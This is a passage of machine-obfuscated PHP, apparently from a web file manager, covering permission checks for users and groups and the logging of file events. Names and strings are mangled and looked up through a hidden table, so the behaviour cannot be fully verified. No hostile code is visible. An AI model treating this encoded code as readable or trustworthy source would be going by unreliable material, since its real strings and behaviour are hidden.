makeSourceAuth($ Ë»óÃí, $İİâì¤¾, $ã’Å‡Ìù = false) { $ºØĞ‚ê =& $_SERVER[ÏéâËõ‘]; $‡ˆìöà… = $ºØĞ‚ê[88]; $¢êƒÖÒ™ = $ Ë»óÃí[$ºØĞ‚ê[505]]; $Õ®Õºá† = $ Ë»óÃí[$ºØĞ‚ê[411]] == SourceModel::TYPE_GROUP; $ßª±–Œä = $Õ®Õºá† ? $this->groupRootAuth($¢êƒÖÒ™, $ã’Å‡Ìù) : !1; if ($ßª±–Œä && Model($ºØĞ‚ê[507])->authCheckAction($ßª±–Œä[$ºØĞ‚ê[413]], $ºØĞ‚ê[1855])) { return $this->groupAuthInfo($ßª±–Œä, $¢êƒÖÒ™); } $şŞÒ²Äæ = Model($ºØĞ‚ê[1332])->parentLevelArray($ Ë»óÃí[$ºØĞ‚ê[521]]); $şŞÒ²Äæ = array_merge(array($ Ë»óÃí[$ºØĞ‚ê[402]]), array_reverse($şŞÒ²Äæ)); $Œ¹¢åœ÷ = !1; foreach ($şŞÒ²Äæ as $ŸÒˆÀ˜³) { if (!isset($İİâì¤¾[$ŸÒˆÀ˜³])) { continue; } $Îº‹Ìêù = $this->authMake($İİâì¤¾[$ŸÒˆÀ˜³], $ã’Å‡Ìù); if ($Îº‹Ìêù[$ºØĞ‚ê[467]]) { $Œ¹¢åœ÷ = $Îº‹Ìêù; break; } } if (!$Õ®Õºá†) { return $Œ¹¢åœ÷; } if (!$Œ¹¢åœ÷ && $ßª±–Œä) { $Œ¹¢åœ÷ = $this->groupAuthInfo($ßª±–Œä, $¢êƒÖÒ™); } if (!$Œ¹¢åœ÷) { $Üœ“²Ğ = Model($ºØĞ‚ê[522])->getInfo($¢êƒÖÒ™); $£²Ñ¡÷¦ = explode($ºØĞ‚ê[50], trim($Üœ“²Ğ[$ºØĞ‚ê[521]], $ºØĞ‚ê[50])); $£²Ñ¡÷¦ = array_reverse($£²Ñ¡÷¦); foreach ($£²Ñ¡÷¦ as $ÌË“áÈ‰) { if ($ÌË“áÈ‰ == $ºØĞ‚ê[197] || $ÌË“áÈ‰ == $‡ˆìöà…) { continue; } $ĞáåÂøş = $this->groupRootAuth($ÌË“áÈ‰, $ã’Å‡Ìù); if (!$ĞáåÂøş) { continue; } $Œ¹¢åœ÷ = $this->groupAuthInfo($ĞáåÂøş, $ÌË“áÈ‰); break; } } if (!$Œ¹¢åœ÷ || $Œ¹¢åœ÷[$ºØĞ‚ê[414]] <= 0) { $¥ëŠ¸ = $this->authDeepCheck($ Ë»óÃí[$ºØĞ‚ê[402]], $ã’Å‡Ìù); if ($¥ëŠ¸) { $Œ¹¢åœ÷ = $¥ëŠ¸; } } return $Œ¹¢åœ÷; } private function userIsRoot($€ĞÇä › = false) { $º’ù½¿ï =& $_SERVER[ÏéâËõ‘]; if (!$€ĞÇä › && _get($GLOBALS, $º’ù½¿ï[503])) { return !0; } $Ã½¸ïï® = Model($º’ù½¿ï[535])->getInfo($€ĞÇä ›); $ï€’›Ø = Model($º’ù½¿ï[2031])->listData($Ã½¸ïï®[$º’ù½¿ï[1541]]); if ($ï€’›Ø && $ï€’›Ø[$º’ù½¿ï[511]][$º’ù½¿ï[2032]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ıİÍºÅ´) { $Èˆ¼¹… =& $_SERVER[ÏéâËõ‘]; $–åï‡³ = Model($Èˆ¼¹…[1332]); $¼ğ¬¾èÄ = $–åï‡³->sourceInfo($ıİÍºÅ´); if (!$¼ğ¬¾èÄ) { return !1; } $–åï‡³->groupPathDisplay($¼ğ¬¾èÄ); $ôŠ““¦¿ = array($¼ğ¬¾èÄ); $ôŠ““¦¿ = $–åï‡³->_listAppendPath($ôŠ““¦¿); $¼ğ¬¾èÄ = $ôŠ““¦¿[0]; $™“¦‚å” = $¼ğ¬¾èÄ[$Èˆ¼¹…[519]]; if (isset($¼ğ¬¾èÄ[$Èˆ¼¹…[527]])) { $‡±ÚÛ¤· = explode($Èˆ¼¹…[8], trim($¼ğ¬¾èÄ[$Èˆ¼¹…[519]], $Èˆ¼¹…[8])); array_shift($‡±ÚÛ¤·); $™“¦‚å” = $¼ğ¬¾èÄ[$Èˆ¼¹…[525]] . $Èˆ¼¹…[2033] . implode($Èˆ¼¹…[8], $‡±ÚÛ¤·); } return array($Èˆ¼¹…[420] => $¼ğ¬¾èÄ[$Èˆ¼¹…[32]], $Èˆ¼¹…[84] => KodIO::make($¼ğ¬¾èÄ[$Èˆ¼¹…[402]]), $Èˆ¼¹…[2034] => $™“¦‚å”); } private function groupAuthInfo($¼ıÊ­ŒÊ, $‡è„ÊœŠ) { $•íí£õˆ =& $_SERVER[ÏéâËõ‘]; $¸ÕÃçıó = Model($•íí£õˆ[522])->getInfo($‡è„ÊœŠ); return array($•íí£õˆ[2035] => intval($¼ıÊ­ŒÊ[$•íí£õˆ[413]]), $•íí£õˆ[2019] => $¼ıÊ­ŒÊ, $•íí£õˆ[2036] => LNG($•íí£õˆ[2037]), $•íí£õˆ[2028] => array($•íí£õˆ[420] => $¸ÕÃçıó[$•íí£õˆ[32]], $•íí£õˆ[84] => KodIO::make($¸ÕÃçıó[$•íí£õˆ[86]][$•íí£õˆ[402]]), $•íí£õˆ[2034] => $¸ÕÃçıó[$•íí£õˆ[526]])); } protected function groupRootAuth($¿¡áÉ†, $‰¬”Àã× = false) { $—Åğ¸ñÃ =& $_SERVER[ÏéâËõ‘]; $‰¬”Àã× = $‰¬”Àã× ? $‰¬”Àã× : USER_ID; $”„›°„ö = $‰¬”Àã× . $—Åğ¸ñÃ[2038] . $¿¡áÉ†; static $ôˆâÂ³ş = array(); if (isset($ôˆâÂ³ş[$”„›°„ö])) { return $ôˆâÂ³ş[$”„›°„ö]; } $¶şÇ„•× = Model($—Åğ¸ñÃ[522])->getInfo($¿¡áÉ†); $šÓ™Ğ»ó = $this->userGroupList($‰¬”Àã×); $ñ¯³ûÓù = isset($šÓ™Ğ»ó[$¿¡áÉ†]) ? $šÓ™Ğ»ó[$¿¡áÉ†][$—Åğ¸ñÃ[413]] : !1; if ($ñ¯³ûÓù && Model($—Åğ¸ñÃ[507])->authCheckAction($ñ¯³ûÓù[$—Åğ¸ñÃ[413]], $—Åğ¸ñÃ[1855])) { $ôˆâÂ³ş[$”„›°„ö] = $ñ¯³ûÓù; return $ñ¯³ûÓù; } $á™ÄåëÏ = $this->sourceAuthSelect($¶şÇ„•×[$—Åğ¸ñÃ[86]][$—Åğ¸ñÃ[402]]); $€‰“Êº = $á™ÄåëÏ ? $this->authMake($á™ÄåëÏ, $‰¬”Àã×) : !1; $¥Ë”ê’û = $€‰“Êº ? $€‰“Êº[$—Åğ¸ñÃ[467]] : !1; $ôˆâÂ³ş[$”„›°„ö] = $¥Ë”ê’û ? $¥Ë”ê’û : $ñ¯³ûÓù; return $ôˆâÂ³ş[$”„›°„ö]; } public function authOwnerApply($€³‘óÂ) { $œŒ ¸÷Ï =& $_SERVER[ÏéâËõ‘]; if (empty($€³‘óÂ[$œŒ ¸÷Ï[413]]) || isset($€³‘óÂ[$œŒ ¸÷Ï[2039]]) && $€³‘óÂ[$œŒ ¸÷Ï[2039]]) { return $€³‘óÂ; } if (AuthModel::authCheckRoot($€³‘óÂ[$œŒ ¸÷Ï[413]][$œŒ ¸÷Ï[414]])) { return $€³‘óÂ; } $ù£àñÁÔ = Model($œŒ ¸÷Ï[1332])->parentLevelArray($€³‘óÂ[$œŒ ¸÷Ï[521]]); $ù£àñÁÔ = array_merge(array($€³‘óÂ[$œŒ ¸÷Ï[402]]), array_reverse($ù£àñÁÔ)); $ş«—üø‰ = $this->sourceAuthSelect($ù£àñÁÔ); $¹Ä˜”ÕÊ = array(); $»ò¹Áåâ = array(); foreach ($ş«—üø‰ as $Íëñğó° => $Û´ûÄäš) { $±—îÇŒ = $this->authFolderOwnerUser($Û´ûÄäš); $¹Ä˜”ÕÊ[$Íëñğó°] = $±—îÇŒ; $»ò¹Áåâ = array_merge($»ò¹Áåâ, $±—îÇŒ[$œŒ ¸÷Ï[600]]); if ($±—îÇŒ[$œŒ ¸÷Ï[2040]]) { break; } } if (count($»ò¹Áåâ) == 0) { $»ò¹Áåâ = $this->authFolderOwnerGroup($€³‘óÂ[$œŒ ¸÷Ï[505]]); } $»ò¹Áåâ = array_unique($»ò¹Áåâ); if (AuthModel::authCheckRoot($€³‘óÂ[$œŒ ¸÷Ï[413]][$œŒ ¸÷Ï[414]])) { $»ò¹Áåâ[] = USER_ID; } $€³‘óÂ[$œŒ ¸÷Ï[413]][$œŒ ¸÷Ï[2041]] = Model($œŒ ¸÷Ï[513])->userListInfo($»ò¹Áåâ); return $€³‘óÂ; } private function authFolderOwnerGroup($ü›î¬ƒÇ) { $ôêİÀ×â =& $_SERVER[ÏéâËõ‘]; $Æ­Û¿Ìì = Model($ôêİÀ×â[1924])->where(array($ôêİÀ×â[1834] => $ü›î¬ƒÇ))->select(); $çËæ³âš = array(); if (!$Æ­Û¿Ìì) { return $çËæ³âš; } foreach ($Æ­Û¿Ìì as $ºöçÃÃ›) { $Ïá‡‘†• = $this->authInfo($ºöçÃÃ›); if (AuthModel::authCheckRoot($Ïá‡‘†•[$ôêİÀ×â[413]])) { $çËæ³âš[] = $ºöçÃÃ›[$ôêİÀ×â[1662]]; } } return $çËæ³âš; } private function authFolderOwnerUser($Û½å­ßº) { $Èßïı¯‰ =& $_SERVER[ÏéâËõ‘]; $óáÁø†× = array(); $Ê‚¹Ú¤š = !1; foreach ($Û½å­ßº as $–É…Ò•Ç) { $‚š¼Ãî = $this->authInfo($–É…Ò•Ç); if ($–É…Ò•Ç[$Èßïı¯‰[505]] == $Èßïı¯‰[197]) { $Ê‚¹Ú¤š = !0; } if ($–É…Ò•Ç[$Èßïı¯‰[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($‚š¼Ãî[$Èßïı¯‰[413]])) { $óáÁø†×[] = $–É…Ò•Ç[$Èßïı¯‰[505]]; } } } return array($Èßïı¯‰[600] => $óáÁø†×, $Èßïı¯‰[2040] => $Ê‚¹Ú¤š); } public function authMake($–ö”Û’ä, $À©ˆ¢Ã„ = false) { $İ øá¶ =& $_SERVER[ÏéâËõ‘]; $ã…ö–óğ = $this->authArrayCheck($–ö”Û’ä, $À©ˆ¢Ã„); if ($ã…ö–óğ[$İ øá¶[2042]]) { $ã…ö–óğ[$İ øá¶[2042]] = $this->sourceAuthInfo($ã…ö–óğ[$İ øá¶[2042]]); } return $ã…ö–óğ; } public function authArrayCheck($š¹œŸåó, $‹²ª¹Á = false) { $èÍ¥Ğ†‚ =& $_SERVER[ÏéâËõ‘]; if (!$š¹œŸåó) { return array($èÍ¥Ğ†‚[414] => 0, $èÍ¥Ğ†‚[467] => !1); } $‹²ª¹Á = $‹²ª¹Á ? $‹²ª¹Á : USER_ID; $÷÷³ÚİÄ = 0; $’ê¦áÇ» = 0; $şÙîÄô = 0; $şŠı¼öø = 0; $…¼ñ‡—Ï = 0; $ŞÛÑ‰‡â = 0; $€˜ª“¬¹ = 1000; $şÕ¨ç“ = 0; $ûĞ”òë– = 0; $éê»³ñï = 0; $¢Ë‚ğ²ë = 0; $¿ËúîÕ» = array($èÍ¥Ğ†‚[402] => 0); foreach ($š¹œŸåó as $¿ËúîÕ») { $…Ÿíºä— = $this->authInfo($¿ËúîÕ»); if (!$…Ÿíºä—) { continue; } $ú¤ç©Ê˜ = $¿ËúîÕ»[$èÍ¥Ğ†‚[505]]; $´ç«ô”º = intval($…Ÿíºä—[$èÍ¥Ğ†‚[413]]); if ($¿ËúîÕ»[$èÍ¥Ğ†‚[411]] == SourceModel::TYPE_USER && $ú¤ç©Ê˜ == $‹²ª¹Á) { $÷÷³ÚİÄ = !0; $şÙîÄô = $…Ÿíºä—; $’ê¦áÇ» = $´ç«ô”º; } else { if ($¿ËúîÕ»[$èÍ¥Ğ†‚[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ú¤ç©Ê˜, $‹²ª¹Á)) { $şŠı¼öø = !0; $éŸéÖ = $this->groupStepToUserGroup($ú¤ç©Ê˜, $‹²ª¹Á); if ($éŸéÖ < $€˜ª“¬¹) { $€˜ª“¬¹ = $éŸéÖ; $…¼ñ‡—Ï = $´ç«ô”º; $ŞÛÑ‰‡â = $…Ÿíºä—; $şÕ¨ç“ = $ú¤ç©Ê˜; } if ($éŸéÖ == $€˜ª“¬¹ && $´ç«ô”º >= $…¼ñ‡—Ï) { $…¼ñ‡—Ï = $´ç«ô”º; $ŞÛÑ‰‡â = $…Ÿíºä—; $şÕ¨ç“ = $ú¤ç©Ê˜; } } else { if ($ú¤ç©Ê˜ == $èÍ¥Ğ†‚[197]) { $ûĞ”òë– = !0; $¢Ë‚ğ²ë = $…Ÿíºä—; $éê»³ñï = $´ç«ô”º; } } } } if ($÷÷³ÚİÄ) { $Ä£Ä¿µº = $’ê¦áÇ»; $…Ÿíºä— = $şÙîÄô; $Çš¨ˆÇ½ = LNG($èÍ¥Ğ†‚[2043]); } else { if ($şŠı¼öø) { $Ä£Ä¿µº = $…¼ñ‡—Ï; $…Ÿíºä— = $ŞÛÑ‰‡â; $£ş®µÁş = Model($èÍ¥Ğ†‚[522])->getInfo($şÕ¨ç“); $Çš¨ˆÇ½ = $èÍ¥Ğ†‚[162] . $£ş®µÁş[$èÍ¥Ğ†‚[526]] . $èÍ¥Ğ†‚[2044] . LNG($èÍ¥Ğ†‚[2045]); } else { if ($ûĞ”òë–) { $Ä£Ä¿µº = $éê»³ñï; $…Ÿíºä— = $¢Ë‚ğ²ë; $Çš¨ˆÇ½ = LNG($èÍ¥Ğ†‚[2016]); } else { $Ä£Ä¿µº = 0; $…Ÿíºä— = !1; $Çš¨ˆÇ½ = $èÍ¥Ğ†‚[12]; } } } $¢¶ÏÓÈ÷ = array($èÍ¥Ğ†‚[2035] => intval($Ä£Ä¿µº), $èÍ¥Ğ†‚[2019] => $…Ÿíºä—, $èÍ¥Ğ†‚[2036] => $Çš¨ˆÇ½, $èÍ¥Ğ†‚[2028] => $¿ËúîÕ»[$èÍ¥Ğ†‚[402]]); return $¢¶ÏÓÈ÷; } private function groupContainUser($µ¥ÚÒÚ, $òâüÃ²Í = false) { return in_array($µ¥ÚÒÚ, $this->userGroupParents($òâüÃ²Í)); } private function groupStepToUserGroup($Áó¢³–Â, $çåµüî = false) { $ÙÂ®âŠ =& $_SERVER[ÏéâËõ‘]; $œÓÀíÓö = $this->userGroupList($çåµüî); $œ¥øÏÎá = 1000; $Îªš·ğô = $GLOBALS[$ÙÂ®âŠ[6]][$ÙÂ®âŠ[89]][$ÙÂ®âŠ[1937]] == 1; $•öÓ´ŒÂ = $Îªš·ğô ? 3 : 2; foreach ($œÓÀíÓö as $¯¿ûáõ) { if ($¯¿ûáõ[$ÙÂ®âŠ[1834]] == $Áó¢³–Â) { return 0; } $”€«÷ö = explode($ÙÂ®âŠ[50], trim($¯¿ûáõ[$ÙÂ®âŠ[521]], $ÙÂ®âŠ[50])); if ($”€«÷ö[0] == $ÙÂ®âŠ[197] && count($”€«÷ö) > $•öÓ´ŒÂ) { $·Ó‘©“Í = array_reverse(array_slice($”€«÷ö, $•öÓ´ŒÂ)); $äñ…¾şä = array_search($Áó¢³–Â, $·Ó‘©“Í); if ($äñ…¾şä !== !1 && $äñ…¾şä + 1 <= $œ¥øÏÎá) { $œ¥øÏÎá = $äñ…¾şä + 1; } } } return $œ¥øÏÎá; } private function userGroupList($àĞê··– = false) { $»ÉÎ¡ =& $_SERVER[ÏéâËõ‘]; static $ç„á³ù· = array(); if (isset($ç„á³ù·[$àĞê··–])) { return $ç„á³ù·[$àĞê··–]; } $¼Í“Üæ› = Model($»ÉÎ¡[535])->getInfo($àĞê··–); $ç„á³ù·[$àĞê··–] = array_to_keyvalue($¼Í“Üæ›[$»ÉÎ¡[2017]], $»ÉÎ¡[1834]); return $ç„á³ù·[$àĞê··–]; } public function userGroupParents($»ƒşĞ) { $âØ·èò— =& $_SERVER[ÏéâËõ‘]; static $™¢ÁÇ¯Õ = array(); $»ƒşĞ = $»ƒşĞ ? $»ƒşĞ : USER_ID; if (isset($™¢ÁÇ¯Õ[$»ƒşĞ])) { return $™¢ÁÇ¯Õ[$»ƒşĞ]; } $Á©õÊ½ = $this->userGroupList($»ƒşĞ); $ñŠ™„Â­ = array(); $ÂæÜˆ¨Ä = $GLOBALS[$âØ·èò—[6]][$âØ·èò—[89]][$âØ·èò—[1937]] == 1; $ø™ïÇ×÷ = $ÂæÜˆ¨Ä ? 3 : 2; foreach ($Á©õÊ½ as $©µÒğ³) { $æÃ£ø±  = array($©µÒğ³[$âØ·èò—[1834]]); $î”ˆ¥Ã = explode($âØ·èò—[50], trim($©µÒğ³[$âØ·èò—[521]], $âØ·èò—[50])); if ($î”ˆ¥Ã[0] == $âØ·èò—[197] && count($î”ˆ¥Ã) > $ø™ïÇ×÷) { $Û˜Ì÷¤¿ = array_slice($î”ˆ¥Ã, $ø™ïÇ×÷); $æÃ£ø±  = array_merge($æÃ£ø± , array_reverse($Û˜Ì÷¤¿)); } $ñŠ™„Â­ = array_merge($ñŠ™„Â­, $æÃ£ø± ); } $™¢ÁÇ¯Õ[$»ƒşĞ] = array_unique($ñŠ™„Â­); return $™¢ÁÇ¯Õ[$»ƒşĞ]; } public function authTargetInfoMake($€•„ß±„) { $¿ÂÇ•ä» =& $_SERVER[ÏéâËõ‘]; $ø ‹èÃÆ = array(); $àÅÀã¶ = array(); foreach ($€•„ß±„ as $Ë¼×«ò) { if ($Ë¼×«ò[$¿ÂÇ•ä»[411]] == SourceModel::TYPE_USER) { $ø ‹èÃÆ[] = intval($Ë¼×«ò[$¿ÂÇ•ä»[505]]); } else { if ($Ë¼×«ò[$¿ÂÇ•ä»[411]] == SourceModel::TYPE_GROUP) { $àÅÀã¶[] = intval($Ë¼×«ò[$¿ÂÇ•ä»[505]]); } } } if ($ø ‹èÃÆ) { $ø ‹èÃÆ = Model($¿ÂÇ•ä»[513])->userListInfo($ø ‹èÃÆ); } if ($àÅÀã¶) { $ÈµØñğŒ = array($¿ÂÇ•ä»[1922] => array($¿ÂÇ•ä»[418], $àÅÀã¶)); $àÅÀã¶ = Model($¿ÂÇ•ä»[522])->field($¿ÂÇ•ä»[2046])->where($ÈµØñğŒ)->select(); $àÅÀã¶ = array_to_keyvalue($àÅÀã¶, $¿ÂÇ•ä»[1834]); } return array($¿ÂÇ•ä»[2047] => $ø ‹èÃÆ, $¿ÂÇ•ä»[2048] => $àÅÀã¶); } public function authInfo($ùç¡­Øå) { $ÂËî·†° =& $_SERVER[ÏéâËõ‘]; if ($ùç¡­Øå[$ÂËî·†°[1938]]) { $·éË—˜ = Model($ÂËî·†°[507])->listData($ùç¡­Øå[$ÂËî·†°[1938]]); if (!$·éË—˜) { return !1; $ªş„¶ÖØ = Model($ÂËî·†°[507])->listData(); $¯ˆ°Á£´ = array_filter_by_field($ªş„¶ÖØ, $ÂËî·†°[413], $ÂËî·†°[197]); return $¯ˆ°Á£´; } $¿ÊÎä‘Ğ = array_field_key($·éË—˜, array($ÂËî·†°[399], $ÂËî·†°[32], $ÂËî·†°[413], $ÂËî·†°[1857], $ÂËî·†°[1858])); $¿ÊÎä‘Ğ[$ÂËî·†°[2049]] = $ùç¡­Øå; return $¿ÊÎä‘Ğ; } else { return array($ÂËî·†°[419] => 0, $ÂËî·†°[1840] => $ùç¡­Øå[$ÂËî·†°[1994]], $ÂËî·†°[420] => $ÂËî·†°[12], $ÂËî·†°[1857] => $ÂËî·†°[2050]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\143\x65\137\145\166\145\x6e\164"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\124\151\155\145", "\x74\x69\x6d\145", "\151\x6e\163\145\x72\x74", "\146\x75\156\x63\164\151\x6f\x6e"), array("\x64\145\163\143", '', "\x69\x6e\163\145\x72\x74\54\x75\160\144\x61\x74\x65\54\x73\145\x6c\x65\143\x74", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ÿ—ŠàÕ, $ÁûíÕ¤®, $ú­íÍæ½ = '') { $ı´Ü•Íö =& $_SERVER[ÏéâËõ‘]; if (!$this->eventSave) { return; } $òÇÍº€– = Model($ı´Ü•Íö[1332])->sourceInfo($Ÿ—ŠàÕ); if (!$òÇÍº€–) { return !1; } if ($this->isCacheEvent($òÇÍº€–, $ÁûíÕ¤®)) { return; } if ($ú­íÍæ½ && is_string($ú­íÍæ½)) { $ú­íÍæ½ = array($ı´Ü•Íö[1873] => $ú­íÍæ½); } $‹¾ƒ°ìÜ = array($ı´Ü•Íö[417] => $Ÿ—ŠàÕ, $ı´Ü•Íö[2051] => $òÇÍº€–[$ı´Ü•Íö[432]], $ı´Ü•Íö[2052] => $òÇÍº€–[$ı´Ü•Íö[32]], $ı´Ü•Íö[519] => !empty($òÇÍº€–[$ı´Ü•Íö[519]]) ? $òÇÍº€–[$ı´Ü•Íö[519]] : $ı´Ü•Íö[12], $ı´Ü•Íö[1653] => USER_ID, $ı´Ü•Íö[422] => $ÁûíÕ¤®, $ı´Ü•Íö[1655] => $ú­íÍæ½); $this->addSystemLog($ÁûíÕ¤®, $‹¾ƒ°ìÜ); unset($‹¾ƒ°ìÜ[$ı´Ü•Íö[2052]], $‹¾ƒ°ìÜ[$ı´Ü•Íö[519]]); return $this->add($‹¾ƒ°ìÜ); } private function addSystemLog($„²Ø µ, $•‘©®¶î) { $ŞëÓ¡ş© =& $_SERVER[ÏéâËõ‘]; if ($„²Ø µ == $ŞëÓ¡ş©[2053]) { $„²Ø µ = $•‘©®¶î[$ŞëÓ¡ş©[453]][$ŞëÓ¡ş©[2054]]; } else { if (in_array($„²Ø µ, array($ŞëÓ¡ş©[1814], $ŞëÓ¡ş©[2055]))) { $„²Ø µ = $•‘©®¶î[$ŞëÓ¡ş©[453]][$ŞëÓ¡ş©[757]]; } } $ë€–ÒÔ = array_merge($•‘©®¶î, array($ŞëÓ¡ş©[2056] => $•‘©®¶î[$ŞëÓ¡ş©[402]], $ŞëÓ¡ş©[2057] => $•‘©®¶î[$ŞëÓ¡ş©[2057]])); Hook::trigger($ŞëÓ¡ş©[2058], $ŞëÓ¡ş©[2059] . $„²Ø µ, $•‘©®¶î); Model($ŞëÓ¡ş©[1778])->addLog($ŞëÓ¡ş©[2059] . $„²Ø µ, $ë€–ÒÔ); } private function isCacheEvent($ÎïïŒÑ˜, $õİ“¹š) { if ($ÎïïŒÑ˜[$_SERVER[ÏéâËõ‘][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($©¢‰Àû, $¿ú›±¿…) { $ç±–àÅœ =& $_SERVER[ÏéâËõ‘]; $ËšÔ¢Œğ = Model($ç±–àÅœ[1332])->sourceInfo($©¢‰Àû); $³µõúàˆ = array($ç±–àÅœ[2054] => $¿ú›±¿…, $ç±–àÅœ[32] => $ËšÔ¢Œğ[$ç±–àÅœ[32]]); return $this->addEvent($©¢‰Àû, $ç±–àÅœ[2053], $³µõúàˆ); } public function eventFileEdit($Ş»Òı¸˜) { $æğó¥ó§ =& $_SERVER[ÏéâËõ‘]; $™Ç†Ë»„ = array($æğó¥ó§[2060] => $_SERVER[$æğó¥ó§[2061]], $æğó¥ó§[2062] => strtolower(ACTION)); if (isset($GLOBALS[$æğó¥ó§[7]][$æğó¥ó§[2063]])) { $™Ç†Ë»„[$æğó¥ó§[2063]] = $æğó¥ó§[88]; } return $this->addEvent($Ş»Òı¸˜, $æğó¥ó§[1804], $™Ç†Ë»„); } public function eventRecycle($å¯Øõí£, $Ã„©†–) { return $this->addEvent($å¯Øõí£, $_SERVER[ÏéâËõ‘][2055], $Ã„©†–); } public function eventRemove($°»´¼®à) { $ãóâäÄı =& $_SERVER[ÏéâËõ‘]; $¢Ÿæ‰¢ = Model($ãóâäÄı[1332])->sourceInfo($°»´¼®à); $•ª»õü = $¢Ÿæ‰¢[$ãóâäÄı[32]]; return $this->addEvent($¢Ÿæ‰¢[$ãóâäÄı[432]], $ãóâäÄı[1803], $•ª»õü); } public function eventShare($Ä¥•÷, $ó‹‘ìÁé) { return $this->addEvent($Ä¥•÷, $_SERVER[ÏéâËõ‘][1814], $ó‹‘ìÁé); } public function eventMove($Œ“óìş, $âŸÖœ, $‡¡óŒÍ) { $•ï¨µÔ =& $_SERVER[ÏéâËõ‘]; $¯Ù¢Öå = Model($•ï¨µÔ[1332]); $Óšş±ã› = $¯Ù¢Öå->sourceInfo($Œ“óìş); $Ì´•íáÔ = $¯Ù¢Öå->sourceInfo($âŸÖœ); $±·†Ù¨Ú = $¯Ù¢Öå->sourceInfo($‡¡óŒÍ); $Ä›‹† = array($•ï¨µÔ[1165] => $âŸÖœ, $•ï¨µÔ[2064] => $Ì´•íáÔ[$•ï¨µÔ[32]], $•ï¨µÔ[2042] => !empty($Ì´•íáÔ[$•ï¨µÔ[519]]) ? $Ì´•íáÔ[$•ï¨µÔ[519]] : $•ï¨µÔ[12], $•ï¨µÔ[1166] => $‡¡óŒÍ, $•ï¨µÔ[2065] => $±·†Ù¨Ú[$•ï¨µÔ[32]], $•ï¨µÔ[2066] => !empty($±·†Ù¨Ú[$•ï¨µÔ[519]]) ? $±·†Ù¨Ú[$•ï¨µÔ[519]] : $•ï¨µÔ[12]); $this->addEvent($Œ“óìş, $•ï¨µÔ[557], $Ä›‹†); $Óšş±ã› = $¯Ù¢Öå->sourceInfo($Œ“óìş); $Ä›‹† = array($•ï¨µÔ[402] => $Óšş±ã›[$•ï¨µÔ[402]], $•ï¨µÔ[32] => $Óšş±ã›[$•ï¨µÔ[32]]); $this->addEvent($âŸÖœ, $•ï¨µÔ[2067], $Ä›‹†); } public function eventCopy($°µ’õš‘) { $this->eventCreate($°µ’õš‘, $_SERVER[ÏéâËõ‘][555]); } public function eventRename($Úôæ·½˜, $ÓëÈúèØ, $ª÷§ìö’) { $ğ’óáÄ =& $_SERVER[ÏéâËõ‘]; $–Ä´ºˆ = array($ğ’óáÄ[1165] => $ÓëÈúèØ, $ğ’óáÄ[1166] => $ª÷§ìö’); return $this->addEvent($Úôæ·½˜, $ğ’óáÄ[1347], $–Ä´ºˆ); } public function eventAddComment($’É´çé, $Û‰¦Ú) { return $this->addEvent($’É´çé, $_SERVER[ÏéâËõ‘][2068], $Û‰¦Ú); } public function eventAddDesc($¹í¦åí•, $õ¿÷Ğè‹) { return $this->addEvent($¹í¦åí•, $_SERVER[ÏéâËõ‘][2069], $õ¿÷Ğè‹); } public function listBySource($î¶¼Çˆ) { $ô„Æä =& $_SERVER[ÏéâËõ‘]; $Ï…”ªŒ— = Model($ô„Æä[1332])->sourceInfo($î¶¼Çˆ); $ô÷§áº = array($ô„Æä[417] => $î¶¼Çˆ); if ($Ï…”ªŒ—[$ô„Æä[410]] == $ô„Æä[88]) { $Ö¥óŞ‘Ú = Model($ô„Æä[1332])->listSearchChildren($î¶¼Çˆ, 20000); $Ö¥óŞ‘Ú[] = $î¶¼Çˆ . $ô„Æä[378]; $ô÷§áº = array($ô„Æä[402] => array($ô„Æä[7], $Ö¥óŞ‘Ú)); } $İ‚­ºì½ = $this->where($ô÷§áº)->order($ô„Æä[2070])->selectPage(); if ($İ‚­ºì½[$ô„Æä[366]][$ô„Æä[367]] == 0) { $İ‚­ºì½[$ô„Æä[366]][$ô„Æä[367]] = 1; $İ‚­ºì½[$ô„Æä[369]] = array(array($ô„Æä[417] => $î¶¼Çˆ, $ô„Æä[2051] => $Ï…”ªŒ—[$ô„Æä[432]], $ô„Æä[1653] => $Ï…”ªŒ—[$ô„Æä[454]], $ô„Æä[422] => $ô„Æä[2071], $ô„Æä[423] => $Ï…”ªŒ—[$ô„Æä[200]], $ô„Æä[1655] => $ô„Æä[12])); } return $this->eventListParse($İ‚­ºì½, $î¶¼Çˆ); } private function eventListParse($›£ãë¿Ô, $’ƒ”–¦‘) { $İê±æÀ¨ =& $_SERVER[ÏéâËõ‘]; $ğ§×¢…Ê = $›£ãë¿Ô[$İê±æÀ¨[369]]; $×­®êï¦ = array_to_keyvalue($ğ§×¢…Ê, $İê±æÀ¨[12], $İê±æÀ¨[402]); $Æ©Å—§ = array_to_keyvalue($ğ§×¢…Ê, $İê±æÀ¨[12], $İê±æÀ¨[2057]); foreach ($ğ§×¢…Ê as $´â¹æÁ) { $ÂµŞ‘¤ = $´â¹æÁ[$İê±æÀ¨[453]]; if ($´â¹æÁ[$İê±æÀ¨[33]] == $İê±æÀ¨[557] && isset($ÂµŞ‘¤[$İê±æÀ¨[1165]])) { $×­®êï¦[] = $ÂµŞ‘¤[$İê±æÀ¨[1165]] . $İê±æÀ¨[12]; $×­®êï¦[] = $ÂµŞ‘¤[$İê±æÀ¨[1166]] . $İê±æÀ¨[12]; } if ($´â¹æÁ[$İê±æÀ¨[33]] == $İê±æÀ¨[2067] && isset($ÂµŞ‘¤[$İê±æÀ¨[402]])) { $×­®êï¦[] = $ÂµŞ‘¤[$İê±æÀ¨[402]] . $İê±æÀ¨[12]; } } $×­®êï¦ = array_merge($×­®êï¦, $Æ©Å—§, array($’ƒ”–¦‘ . $İê±æÀ¨[12])); $×­®êï¦ = array_unique($×­®êï¦); $‘·Ç®‘É = array_unique(array_to_keyvalue($ğ§×¢…Ê, $İê±æÀ¨[12], $İê±æÀ¨[1662])); $•ÈíÔÍ = Model($İê±æÀ¨[535])->userListInfo($‘·Ç®‘É); $¦³Ç¯¦Ó = Model($İê±æÀ¨[827])->sourceListInfo($×­®êï¦, !0); foreach ($ğ§×¢…Ê as &$´â¹æÁ) { if 